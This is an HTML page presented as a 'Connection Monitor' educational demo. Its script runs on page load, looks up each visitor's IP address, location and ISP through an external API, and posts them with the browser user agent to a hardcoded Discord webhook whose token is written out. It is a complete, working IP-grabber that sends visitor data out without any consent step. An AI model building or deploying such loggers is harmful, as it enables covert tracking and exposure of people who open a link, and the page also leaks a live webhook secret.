<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Information Lab</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .glass-morphism {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">

    <div class="max-w-md w-full space-y-6">
        <div class="glass-morphism p-8 rounded-2xl shadow-2xl text-center">
            <h1 class="text-2xl font-bold mb-2 text-blue-400">Connection Monitor</h1>
            <p class="text-slate-400 text-sm mb-6">Educational demo: Data is sent to the webhook automatically on visit.</p>

            <div id="status-container" class="space-y-4">
                <!-- Loading State -->
                <div id="loading" class="flex flex-col items-center py-8">
                    <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mb-4"></div>
                    <p class="text-slate-400 animate-pulse">Fetching network details...</p>
                </div>

                <!-- Success State -->
                <div id="data-display" class="hidden space-y-4">
                    <div class="bg-emerald-500/10 border border-emerald-500/20 p-4 rounded-xl">
                        <div class="text-emerald-400 font-bold text-lg mb-1">Data Logged</div>
                        <p class="text-xs text-slate-400">Your connection info has been sent to the Discord channel.</p>
                    </div>
                    
                    <div class="bg-slate-800/50 p-4 rounded-lg border border-slate-700 text-left">
                        <label class="text-xs uppercase tracking-wider text-slate-500 font-semibold">Logged IP</label>
                        <div id="ip-addr" class="text-xl font-mono text-blue-400">---</div>
                    </div>
                </div>

                <!-- Error State -->
                <div id="error-display" class="hidden p-4 bg-red-900/20 border border-red-500/20 rounded-xl">
                    <p id="error-text" class="text-red-400 text-sm"></p>
                </div>
            </div>
        </div>

        <div class="text-center text-slate-500 text-xs">
            Notice: This tool is for demonstration of automated API requests and webhook integration.
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485363779213463575/QV1y69iiPeM1fJ2thEJj4-GJIXOLiye57z_ka9LQb5JJ_DrIZdjkEdRT7HSS27T_3J6I';

        // 1. Send Data to Discord
        async function sendToDiscord(data) {
            const payload = {
                username: "Instant Access Logger",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/2111/2111370.png",
                embeds: [{
                    title: "🔔 Instant Visit Logged",
                    color: 15158332, // Red/Orange
                    description: "A user has just visited the demonstration page.",
                    fields: [
                        { name: "IP Address", value: `\`${data.ip}\``, inline: true },
                        { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
                        { name: "ISP", value: data.org || 'Unknown', inline: false },
                        { name: "User Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Automated Educational Demo • " + new Date().toLocaleString() }
                }]
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // Show success in UI
                document.getElementById('loading').classList.add('hidden');
                document.getElementById('data-display').classList.remove('hidden');
                document.getElementById('ip-addr').textContent = data.ip;
            } catch (err) {
                showError("Could not notify webhook: " + err.message);
            }
        }

        // 2. Fetch IP Data (Triggers on load)
        async function initializeCapture() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('Network data unavailable');
                
                const ipData = await response.json();
                
                // Immediately send to Discord once data is ready
                await sendToDiscord(ipData);
                
            } catch (err) {
                showError("Failed to initialize: " + err.message);
            }
        }

        function showError(msg) {
            document.getElementById('loading').classList.add('hidden');
            const errEl = document.getElementById('error-display');
            errEl.classList.remove('hidden');
            document.getElementById('error-text').textContent = msg;
        }

        // Start the process as soon as the window loads
        window.onload = initializeCapture;
    </script>
</body>
</html>
